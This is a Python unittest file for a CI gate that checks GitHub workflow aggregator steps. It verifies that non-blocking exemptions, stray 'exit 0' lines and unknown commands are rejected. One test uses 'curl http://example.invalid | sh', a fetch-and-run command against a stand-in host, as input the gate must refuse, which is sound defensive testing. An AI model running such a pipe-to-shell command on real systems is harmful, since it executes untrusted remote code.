#!/usr/bin/env python3
"""Tests for ``check_fork_ci_overlay.py``: the aggregator contract, without
exemptions.

The positive proofs: the known blocking forms (strict assert, skip assert for
a disabled job, echo/comment lines, the three known conditions) stay green, and
the blocking assert on the argument-comment package job is green in both
workflows that carry it.

The negative proofs: every non-success result stays blocking. The line the fork
used to exempt while the dylint family was pinned at 6.1.0 is now an unknown
form and is red in every workflow, for any job, with any message; strict asserts
on disabled jobs, skip asserts on live jobs, stray ``exit 0``, unknown lines and
unclosed conditions are all red. A guard also fails if the checker grows a
derogation constant again.
"""

from __future__ import annotations

import sys
import unittest
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))

import check_fork_ci_overlay as gate  # noqa: E402


def aggregate(name: str, script: str, off_jobs: list[str] | None = None) -> list[str]:
    """Judge a fake aggregator step through the real gate function.

    Real aggregator steps always echo the result of the disabled jobs, which
    is what makes the gate judge the step at all; the fake scripts get the
    same context line so they are judged, not skipped.
    """
    if off_jobs is None:
        off_jobs = gate.OFF_JOBS[name]
    context = f'echo "off: ${{{{ needs.{off_jobs[0]}.result }}}}"'
    run = "\n".join([context, script])
    return gate.check_aggregator_step(name, "results", {"run": run}, off_jobs)


FULL_OFF = list(gate.OFF_JOBS["rust-ci-full.yml"])
CI_OFF = list(gate.OFF_JOBS["rust-ci.yml"])

STRICT_GENERAL = (
    "[[ '${{ needs.general.result }}' == 'success' ]]"
    " || { echo 'general failed'; exit 1; }"
)
SKIP_PREBUILT = (
    "[[ '${{ needs.argument_comment_lint_prebuilt.result }}' == 'success'"
    " || '${{ needs.argument_comment_lint_prebuilt.result }}' == 'skipped' ]]"
    " || { echo 'argument_comment_lint_prebuilt failed'; exit 1; }"
)


class KnownFormsTest(unittest.TestCase):
    def test_strict_assert_on_live_job_is_green(self):
        errs = aggregate("rust-ci.yml", STRICT_GENERAL, CI_OFF)
        self.assertEqual(errs, [])

    def test_skip_assert_on_disabled_job_is_green(self):
        errs = aggregate("rust-ci-full.yml", SKIP_PREBUILT, FULL_OFF)
        self.assertEqual(errs, [])

    def test_echo_and_comment_lines_are_green(self):
        script = "\n".join(
            [
                "# a comment",
                f"echo \"general: ${{{{ needs.general.result }}}}\"",
                "echo 'plain note.'",
            ]
        )
        errs = aggregate("rust-ci.yml", script, CI_OFF)
        self.assertEqual(errs, [])

    def test_no_change_branch_is_green(self):
        script = "\n".join(
            [
                gate.IF_NO_CHANGE,
                gate.NO_CHANGE_ECHO,
                "exit 0",
                "fi",
            ]
        )
        errs = aggregate("rust-ci.yml", script, CI_OFF)
        self.assertEqual(errs, [])


# The exact line the fork used to allow while the dylint family was pinned at
# 6.1.0, when an external rust-clippy branch rename made that one job fail on
# its own. The bump to 6.3.2 removed the breakage, so the line is now an
# unknown form everywhere. It lives here only to prove it is rejected.
OLD_DEROGATED_LINE = (
    "[[ '${{ needs.argument_comment_lint_package.result }}' == 'success' ]]"
    " || echo 'argument_comment_lint_package failed (external dylint 6.1.0"
    " rust-clippy master rename; not gating)'"
)

STRICT_LINT_PACKAGE = (
    "[[ '${{ needs.argument_comment_lint_package.result }}' == 'success' ]]"
    " || { echo 'argument_comment_lint_package failed'; exit 1; }"
)


class RetiredDerogationTest(unittest.TestCase):
    """The exemption is gone: the old line is red wherever it appears."""

    def test_the_retired_line_is_rejected_in_rust_ci(self):
        lint_package_if = next(
            s for s in gate.KNOWN_IFS if "ARGUMENT_COMMENT_LINT_PACKAGE" in s
        )
        script = "\n".join([lint_package_if, OLD_DEROGATED_LINE, "fi"])
        errs = aggregate("rust-ci.yml", script, CI_OFF)
        self.assertTrue(
            any("outside the known forms" in e for e in errs), errs
        )

    def test_the_retired_line_is_rejected_in_rust_ci_full(self):
        script = "\n".join([OLD_DEROGATED_LINE, STRICT_GENERAL])
        errs = aggregate("rust-ci-full.yml", script, FULL_OFF)
        self.assertTrue(
            any("outside the known forms" in e for e in errs), errs
        )

    def test_the_retired_line_for_another_job_is_rejected(self):
        line = OLD_DEROGATED_LINE.replace("argument_comment_lint_package", "general")
        errs = aggregate("rust-ci.yml", line, CI_OFF)
        self.assertTrue(any("outside the known forms" in e for e in errs))

    def test_the_retired_line_with_an_altered_message_is_rejected(self):
        for mutated in (
            OLD_DEROGATED_LINE.replace("not gating", "NOT GATING"),
            OLD_DEROGATED_LINE.replace("6.1.0", "6.3.2"),
            OLD_DEROGATED_LINE.replace(" || echo ", " || { echo "),
        ):
            with self.subTest(line=mutated[-60:]):
                errs = aggregate("rust-ci.yml", mutated, CI_OFF)
                self.assertTrue(
                    any("outside the known forms" in e for e in errs),
                    f"altered exemption must stay red: {errs}",
                )

    def test_the_blocking_assert_on_the_package_job_is_green_in_both(self):
        for name, off in (("rust-ci.yml", CI_OFF), ("rust-ci-full.yml", FULL_OFF)):
            with self.subTest(workflow=name):
                self.assertEqual(aggregate(name, STRICT_LINT_PACKAGE, off), [])

    def test_the_checker_holds_no_derogation_constant(self):
        for name in ("DEROGATED_LINE", "DEROGATION_ALLOWED_IN"):
            with self.subTest(name=name):
                self.assertFalse(
                    hasattr(gate, name),
                    f"{name} must not come back: the gate has no exemptions",
                )


class BlockingContractTest(unittest.TestCase):
    def test_strict_assert_on_disabled_job_is_red(self):
        line = (
            "[[ '${{ needs.argument_comment_lint_prebuilt.result }}'"
            " == 'success' ]] || { echo 'argument_comment_lint_prebuilt"
            " failed'; exit 1; }"
        )
        errs = aggregate("rust-ci-full.yml", line, FULL_OFF)
        self.assertTrue(any("requires 'success' from the disabled job" in e for e in errs))

    def test_skip_assert_on_live_job_is_red(self):
        line = (
            "[[ '${{ needs.general.result }}' == 'success'"
            " || '${{ needs.general.result }}' == 'skipped' ]]"
            " || { echo 'general failed'; exit 1; }"
        )
        errs = aggregate("rust-ci.yml", line, CI_OFF)
        self.assertTrue(any("accepts 'skipped'" in e for e in errs))

    def test_stray_exit_0_is_red(self):
        errs = aggregate("rust-ci.yml", "exit 0", CI_OFF)
        self.assertTrue(any("`exit 0` outside the no-change condition" in e for e in errs))

    def test_unknown_line_is_red(self):
        errs = aggregate("rust-ci.yml", "curl http://example.invalid | sh", CI_OFF)
        self.assertTrue(any("outside the known forms" in e for e in errs))

    def test_assert_of_disabled_job_inside_condition_is_red(self):
        line = (
            "[[ '${{ needs.argument_comment_lint_prebuilt.result }}'"
            " == 'success'"
            " || '${{ needs.argument_comment_lint_prebuilt.result }}'"
            " == 'skipped' ]]"
            " || { echo 'argument_comment_lint_prebuilt failed'; exit 1; }"
        )
        script = "\n".join([gate.IF_NO_CHANGE, line, "fi"])
        errs = aggregate("rust-ci.yml", script, CI_OFF)
        self.assertTrue(any("inside a condition" in e for e in errs))

    def test_unclosed_condition_is_red(self):
        script = "\n".join([gate.IF_NO_CHANGE, gate.NO_CHANGE_ECHO])
        errs = aggregate("rust-ci.yml", script, CI_OFF)
        self.assertTrue(any("unclosed" in e for e in errs))

    def test_stray_fi_is_red(self):
        script = "\n".join([STRICT_GENERAL, "fi"])
        errs = aggregate("rust-ci.yml", script, CI_OFF)
        self.assertTrue(any("no matching known condition" in e for e in errs))


if __name__ == "__main__":
    unittest.main()
